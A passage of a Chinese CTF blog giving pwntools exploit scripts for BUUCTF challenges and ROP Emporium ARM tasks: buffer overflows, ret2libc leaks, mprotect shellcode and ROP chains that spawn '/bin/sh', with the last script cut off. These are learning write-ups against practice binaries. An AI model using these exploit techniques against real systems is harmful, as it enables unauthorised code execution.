<h1 id="buu009-ciscn_2019_n_8"><a class="markdownIt-Anchor" href="#buu009-ciscn_2019_n_8"></a> buu009-ciscn_2019_n_8</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26497</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, cyclic(<span class="number">4</span> * <span class="number">13</span>) + p32(<span class="number">17</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu010-jarvisoj_level2"><a class="markdownIt-Anchor" href="#buu010-jarvisoj_level2"></a> buu010-jarvisoj_level2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29788</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(binsh_addr) + p32(binsh_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu011-ogeek2019babyrop"><a class="markdownIt-Anchor" href="#buu011-ogeek2019babyrop"></a> buu011-[OGeek2019]babyrop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27628</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">exp = <span class="number">0x8048825</span></span><br><span class="line">ret = <span class="number">0x8048502</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(exp)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu012-bjdctf_2020_babystack"><a class="markdownIt-Anchor" href="#buu012-bjdctf_2020_babystack"></a> buu012-bjdctf_2020_babystack</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27538</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;length of your name:&#x27;</span>, <span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">0x10</span> + <span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu013-get_started_3dsctf_2016"><a class="markdownIt-Anchor" href="#buu013-get_started_3dsctf_2016"></a> buu013-get_started_3dsctf_2016</h1>
<p>不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 <s>（屑）</s><br />
使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。<br />
<img src="1.png" alt="" /><br />
exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">start = <span class="number">0x80eb000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">bss = <span class="number">0x803bf80</span></span><br><span class="line">pop3 = <span class="number">0x0809e4c5</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(length)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(<span class="number">0</span>)	<span class="comment"># stdin</span></span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(start)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu014-ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#buu014-ciscn_2019_en_2"></a> buu014-ciscn_2019_en_2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25743</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)	<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu015-harekazectf2019baby_rop"><a class="markdownIt-Anchor" href="#buu015-harekazectf2019baby_rop"></a> buu015-[HarekazeCTF2019]baby_rop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28394</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x600a90</span></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu016-jarvisoj_level2_x64"><a class="markdownIt-Anchor" href="#buu016-jarvisoj_level2_x64"></a> buu016-jarvisoj_level2_x64</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25723</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400683</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, cyclic(<span class="number">0x18</span>) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">ARM pwn 入门 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:03:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:03:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:23" itemprop="dateModified" datetime="2023-03-01T11:30:23+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="font-face汉仪唐美人3-callmefont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人3-callmefont"></a> <font face=汉仪唐美人>3. callme</font></h1>
<p><font face=汉仪唐美人>本题有多个文件，根据题意来看是需要依次调用<code>callme_one</code>、<code>callme_two</code>、<code>callme_three</code>这3个库函数。这三个函数会进行flag的解密，但是需要满足前三个参数等于特定值。这就需要我们去elf文件中寻找合适的gadget了。</font></p>
<p><img src="1.png" alt="" /></p>
<p><font face=汉仪唐美人>而本题正好给出了一个不能再合适的gadget，因为本题的考点就在这里：</font></p>
<p><img src="2.png" alt="" /></p>
<p><font face=汉仪唐美人>因此思路就很简单了，直接重复调用这个gadget修改前3个寄存器的值，再分别调用三个callme函数即可。</font></p>
<p><font face=汉仪唐美人>这里需要注意的是，elf文件中虽然给出了一个可以调用3个库函数的函数，能够填充got表，但由于ROP只能写入已知地址，如果写入的是got表的地址，那么程序就会将got表地址当做指令地址来执行，这显然是不对的，少了一层解引用。因此我们需要使用plt表进行利用。和x86架构下的利用相同，如果要使用plt表进行利用，需要注意返回地址的设置。<font color=red>如果plt地址卸载栈上地址值为a的地方，ROP到此，返回地址应该为a-8，且返回后SP指向a+8处</font>。因此，我们需要在<code>callme_one</code>函数的plt地址前面写下一个ROP导向地址。</font></p>
<p><font face=汉仪唐美人>因此我们可以直接在这里写<code>useful_gadget</code>的地址，在<code>callme_one</code>后面直接写三个参数，然后再调用下一个库函数，以此类推。</font></p>
<p><font face=汉仪唐美人>exp：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-arm-static&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;-g&#x27;, &#x27;9999&#x27;, &#x27;./callme_armv5&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./callme_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">useful_gadget = <span class="number">0x10870</span></span><br><span class="line">pop_out = <span class="number">0x108dc</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(useful_gadget)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(useful_gadget) + p32(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xd00df00d</span>)</span><br><span class="line">payload += p32(pop_out) + p32(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="3.png" alt="" /></p>
<h1 id="font-face汉仪唐美人4-write4font"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人4-write4font"></a> <font face=汉仪唐美人>4. write4</font></h1>
<p><font face=汉仪唐美人>本题的pwnme和print_file函数都写在了库函数中，但观察elf文件可以发现有两个gadget：</font></p>
<p><img src="4.png" alt="" /></p>
<p><font face=汉仪唐美人>其中第一个为任一地址写指令，第二个可以用作ROP的gadget。考虑到print_file函数需要传入一个字符串参数作为打开的文件，我们需要将flag.txt写到一个特定的地方，然后使用第二个gadget即可传参。</font></p>
<p><img src="5.png" alt="" /></p>
<p><font face=汉仪唐美人>和x86的本题不同，这里的bss段太小，无法写入，因此尝试写入到data段。</font></p>
<p><img src="6.png" alt="" /></p>
<p><font face=汉仪唐美人>exp：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./write4_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line">write_gadget = <span class="number">0x105ec</span></span><br><span class="line">pop_r0pc = <span class="number">0x105f4</span></span><br><span class="line">pop_r3r4pc = <span class="number">0x105f0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r3r4pc) + <span class="string">b&#x27;flag&#x27;</span> + p32(write_addr)</span><br><span class="line">payload += p32(write_gadget) + <span class="string">b&#x27;.txt&#x27;</span> + p32(write_addr + <span class="number">4</span>);</span><br><span class="line">payload += p32(write_gadget) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p32(pop_r0pc) + p32(write_addr) + p32(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="7.png" alt="" /></p>
<h1 id="font-face汉仪唐美人5-badcharsfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人5-badcharsfont"></a> <font face=汉仪唐美人>5. badchars</font></h1>
<p><font face=汉仪唐美人>本题的pwnme中栈溢出过滤了4个字符：x、g、a、.，因此需要利用elf中的gadget。我们看一下都有什么gadget。</font></p>
<p><img src="8.png" alt="" /></p>
<p><font face=汉仪唐美人>第一段gadget：[R5]=[R5]-R6; 赋值R0</font><br />
<font face=汉仪唐美人>第二段gadget：[R5]=[R5]+R6; 赋值R0</font><br />
<font face=汉仪唐美人>第三段gadget：[R4]=R3; 赋值R5和R6</font><br />
<font face=汉仪唐美人>第四段gadget：[R5]=[R5]^R6; 赋值R0</font></p>
<p><font face=汉仪唐美人>看到了异或操作，我们可以利用这个异或操作在数据区构造出来关键字符。这里的加法、减法和异或操作实际上只需要一个就可以了。我们将字符串写在和上一道题相同的位置。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars_armv5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>, <span class="string">&#x27;./badchars_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x105f0</span>, <span class="number">0x10600</span>, <span class="number">0x10610</span>, <span class="number">0x10618</span>]</span><br><span class="line">write_addr = <span class="number">0x21024</span></span><br><span class="line"></span><br><span class="line">payload = p32(write_addr + <span class="number">12</span>) * (<span class="number">0x2c</span> // <span class="number">4</span>)	<span class="comment"># 这里要写一个有效地址，不然STR R3, [R4]会报错</span></span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + <span class="string">b&#x27;fl&#x27;</span> + p8(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="number">0xFF</span>) + p8(<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>) ^ <span class="number">0xFF</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">1</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">2</span>]) + p32(write_addr) + p32(<span class="number">0xFFFF0000</span>)</span><br><span class="line">payload += p32(gadgets[<span class="number">3</span>]) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(gadgets[<span 